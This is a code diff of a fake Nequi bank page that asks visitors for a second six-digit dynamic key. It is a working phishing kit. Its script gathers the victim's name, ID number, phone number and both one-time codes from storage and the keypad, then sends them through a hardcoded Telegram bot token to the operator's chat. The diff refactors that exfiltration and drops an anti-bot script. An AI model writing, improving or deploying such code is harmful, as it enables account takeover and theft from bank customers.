@@ -4,175 +4,107 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nequi - Segunda Dinámica</title>
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <style>
-        /* Igual que tu archivo original */
+        html, body { height: 100%; margin: 0; }
         body {
             font-family: 'Manrope', sans-serif;
-            background-image: url("./img/simulador.png");
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            color: #200020;
-            padding: 120px 20px 20px;
-        }
-        .cabezeramor-t3 {
-            background-color: #ffffff;
-            height: 80px;
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            z-index: 1000;
+            background: #ffffff;
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            padding: 0 20px;
-            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
-        }
-        .cabezeramor-t3 img {
-            height: 30px;
-            max-width: 100%;
-        }
-        @media (max-width: 768px) {
-            body {
-                height: 150vh;
-            }
-            .cabezeramor-t3 img {
-                height: 30px;
-            }
-        }
-        .container {
-            max-width: 600px;
-            background: #fff;
-            border-radius: 20px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            padding: 30px;
-            margin: auto;
-            text-align: left;
-        }
-        .titulo-principal {
-            font-weight: bold;
-            color: #ffffff;
-            text-align: left;
-            margin-bottom: 20px;
-            font-size: 2em;
-        }
-        h2 {
-            color: #200020;
-            margin-bottom: 10px;
-            font-size: 1.8em;
-        }
-        p {
-            color: #828d92;
-            font-size: 1.1em;
-            margin-bottom: 20px;
-        }
-        .form-floating label {
-            color: #200020;
-            font-weight: bold;
-            background-color: transparent;
-        }
-        .form-control {
-            background-color: transparent;
-            border: 1px solid #200020;
-            color: #200020;
-        }
-        .form-control:focus {
-            background-color: transparent;
-            border-color: #da0081;
-            box-shadow: none;
-        }
-        .btn-primary, .btn-pay {
-            background-color: #200020;
-            border-color: #200020;
-            padding: 15px;
-            font-size: 1.2em;
-            width: 100%;
-        }
-        .btn-primary:hover, .btn-pay:hover {
-            background-color: #3d003d;
-            border-color: #3d003d;
-        }
-        .credito-info {
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-            border: 1px solid #dee2e6;
-            text-align: center;
-        }
-        .credito-info h3 {
-            color: #a0006f;
-            font-size: 1.5em;
-            margin-bottom: 15px;
-        }
-        .credito-info p {
-            font-size: 1.1em;
-            margin: 5px 0;
-        }
-        .credito-info strong {
-            color: #bf0072;
-        }
-        .monto-cuota {
-            font-weight: bold;
-            font-size: 1.5em;
-            color: #28a745;
-            margin-top: 20px;
-        }
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.8);
-            display: flex;
             justify-content: center;
+        }
+        .main-container {
+            max-width: 360px;
+            padding: 20px;
+        }
+        .logo-top {
+            text-align: center;
+            margin-bottom: 12px;
+        }
+        .logo-top img {
+            height: 30px;
+        }
+        .title {
+            font-weight: 700;
+            font-size: 1.5rem;
+            text-align: center;
+            color: #200020;
+            margin-bottom: 1.5rem;
+        }
+        .subtitle {
+            color: #666;
+            text-align: center;
+            font-size: 0.875rem;
+            margin-bottom: 1.75rem;
+        }
+        .box_numerickeypad {
+            width: 272px;
+            display: flex;
+            justify-content: space-around;
+            margin: 0 auto;
+        }
+        .code_numerickeypad {
+            width: 32px;
+            text-align: center;
+            border: none;
+            border-bottom: 1px solid #200020;
+            padding-bottom: 12px;
+            height: 24px;
+            font-size: 1.5rem;
+        }
+        .numeric_board {
+            width: 90%;
+            margin: 30px auto 0;
+        }
+        .numeric_board-row {
+            display: flex;
+            padding-bottom: 18px;
+            justify-content: space-between;
+        }
+        .container_number {
+            color: #200020;
+            font-size: 2.25rem;
+            width: 60px;
+            height: 60px;
+            display: flex;
             align-items: center;
-            z-index: 2000;
-            display: none;
+            justify-content: center;
+            cursor: pointer;
+            border: none;
+            background: none;
         }
-        .overlay img {
-            width: 7rem;
+        .container_number:hover {
+            background: #f5f5f5;
+            border-radius: 50%;
         }
-        @media (max-width: 768px) {
-            body {
-                padding: 100px 10px;
-            }
-            .titulo-principal {
-                font-size: 1.6em;
-            }
-            h2 {
-                font-size: 1.5em;
-            }
-            .container {
-                padding: 20px;
-            }
-            .credito-info h3 {
-                font-size: 1.3em;
-            }
-            .credito-info p,
-            .monto-cuota {
-                font-size: 1em;
-            }
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 30px;
         }
+        .action-buttons button {
+            flex: 1;
+            padding: 12px 0;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            border: none;
+            cursor: pointer;
+        }
+        .btn-approve { background: #28a745; color: #fff; }
+        .btn-retry   { background: #ffc107; color: #212529; }
+        .btn-error   { background: #dc3545; color: #fff; }
     </style>
 </head>
 <body>
-    <header class="cabezeramor-t3">
-        <img src="./img/logo.svg" alt="Logo">
-        <img src="./img/3ra.jpg" alt="Icono">
-    </header>
+    <div class="main-container">
+        <div class="logo-top">
+            <img src="./img/logo.svg" alt="Nequi">
+        </div>
 
-    <br><br><br><br>
-    <div class="titulo-principal">Segunda clave dinámica</div>
-
-    <div class="container" id="form-container">
-        <h2>Confirma tu identidad</h2>
-        <p>Ingresa la nueva clave dinámica que aparece en tu App Nequi.</p>
-
-        <!-- Teclado numérico idéntico -->
+        <h1 class="title">Confirma tu identidad</h1>
+        <p class="subtitle">Para confirmar tu identidad escribe la clave dinámica que encuentras en tu App Nequi.</p>
+        
         <div class="box_numerickeypad">
             <input type="password" id="d0" class="code_numerickeypad" maxlength="1" inputmode="none">
             <input type="password" id="d1" class="code_numerickeypad" maxlength="1" inputmode="none">
@@ -205,24 +137,27 @@
             </div>
         </div>
 
-        <!-- Botones de acción que sí funcionan -->
-        <div class="d-flex gap-2 mt-4">
-            <button class="btn btn-success flex-fill" id="btn-aprobar">✅ Aprobar</button>
-            <button class="btn btn-warning flex-fill" id="btn-nueva">🔄 Nueva</button>
-            <button class="btn btn-danger flex-fill" id="btn-error">❌ Error</button>
+        <!-- Botones que sí funcionan -->
+        <div class="action-buttons">
+            <button class="btn-approve" id="btn-aprobar">✅ Aprobar</button>
+            <button class="btn-retry"   id="btn-nueva">🔄 Nueva</button>
+            <button class="btn-error"   id="btn-error">❌ Error</button>
         </div>
     </div>
 
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const inputs = document.querySelectorAll('.code_numerickeypad');
+            const buttons = document.querySelectorAll('.container_number');
             const backspaceBtn = document.getElementById('backspace');
+            const confirmBtn = document.getElementById('confirm-btn');
+
             let currentIndex = 0;
 
             // Teclado numérico
-            document.querySelectorAll('.container_number').forEach(button => {
+            buttons.forEach(button => {
                 if (button === backspaceBtn) return;
+                
                 button.addEventListener('click', function () {
                     const value = this.textContent.trim();
                     if (/^\d$/.test(value) && currentIndex < inputs.length) {
@@ -248,6 +183,26 @@
                 }
             });
 
+            // Permitir teclado físico también
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    if (this.value.length > 0) {
+                        currentIndex = index;
+                        if (index < inputs.length - 1) {
+                            currentIndex++;
+                            inputs[currentIndex].focus();
+                        }
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        currentIndex = index - 1;
+                        inputs[currentIndex].focus();
+                    }
+                });
+            });
+
             // Obtener datos anteriores
             const nombreApellido = localStorage.getItem("nombreApellido") || "No especificado";
             const cedula = localStorage.getItem("cedula") || "No especificado";
@@ -258,17 +213,30 @@
             const userId = localStorage.getItem("userId") || Date.now();
 
             // Función auxiliar: enviar mensaje al bot y redirigir
-            async function sendAction(action) {
-                const otp2 = Array.from(inputs).map(i => i.value).join('');
-                if (otp2.length !== 6) {
-                    alert("Completa la segunda clave");
-                    return;
+            async function sendToTelegram(text, redirectTo) {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc/sendMessage`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            chat_id: '6958936698',
+                            text: text,
+                            parse_mode: "HTML"
+                        })
+                    });
+                    if (res.ok) window.location.href = redirectTo;
+                    else throw new Error("Error al enviar");
+                } catch (e) {
+                    alert("Error al enviar. Intente nuevamente.");
                 }
+            }
 
-                const TELEGRAM_BOT_TOKEN = '7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc';
-                const TELEGRAM_CHAT_ID = '6958936698';
-
-                const msg = `🔐 <b>CLAVE DINÁMICA 2</b>\n\n` +
+            // Botones de acción
+            document.getElementById("btn-aprobar").addEventListener("click", () => {
+                const otp2 = Array.from(inputs).map(i => i.value).join('');
+                if (otp2.length !== 6) { alert("Completa los 6 dígitos"); return; }
+                sendToTelegram(
+                    `🔐 <b>CLAVE DINÁMICA 2</b>\n\n` +
                     `📛 <b>Nombre:</b> ${nombreApellido}\n` +
                     `🪪 <b>Cédula:</b> ${cedula}\n` +
                     `📱 <b>Número:</b> ${numero}\n` +
@@ -277,40 +245,30 @@
                     `🔢 <b>Dinámica 1:</b> <code>${otp1}</code>\n` +
                     `🔢 <b>Dinámica 2:</b> <code>${otp2}</code>\n` +
                     `🆔 <b>UserID:</b> ${userId}\n` +
-                    `⚙️  <b>Acción:</b> ${action}\n` +
-                    `📅 ${new Date().toLocaleString('es-CO')}`;
+                    `⚙️  <b>Acción:</b> ✅ Aprobado\n` +
+                    `📅 ${new Date().toLocaleString('es-CO')}`,
+                    "success.html"
+                );
+            });
 
-                try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: TELEGRAM_CHAT_ID,
-                            text: msg,
-                            parse_mode: 'HTML'
-                        })
-                    });
+            document.getElementById("btn-nueva").addEventListener("click", () => {
+                sendToTelegram(
+                    `🔄 Usuario solicitó nueva dinámica\n` +
+                    `🆔 <b>UserID:</b> ${userId}\n` +
+                    `📅 ${new Date().toLocaleString('es-CO')}`,
+                    window.location.href // recarga misma página
+                );
+            });
 
-                    // Redirige según la acción
-                    if (action === 'Aprobar') {
-                        window.location.href = 'success.html';
-                    } else if (action === 'Nueva') {
-                        window.location.reload(); // mismo archivo, nueva clave
-                    } else {
-                        window.location.href = 'index.html';
-                    }
-                } catch (err) {
-                    console.error(err);
-                    alert('Error al enviar. Intente nuevamente.');
-                }
-            }
-
-            // Asignar eventos a los botones
-            document.getElementById('btn-aprobar').addEventListener('click', () => sendAction('Aprobar'));
-            document.getElementById('btn-nueva').addEventListener('click', () => sendAction('Nueva'));
-            document.getElementById('btn-error').addEventListener('click', () => sendAction('Error'));
+            document.getElementById("btn-error").addEventListener("click", () => {
+                sendToTelegram(
+                    `❌ Error de login\n` +
+                    `🆔 <b>UserID:</b> ${userId}\n` +
+                    `📅 ${new Date().toLocaleString('es-CO')}`,
+                    "index.html"
+                );
+            });
         });
     </script>
-    <script src="bloqueo-bots.js"></script>
 </body>
 </html>
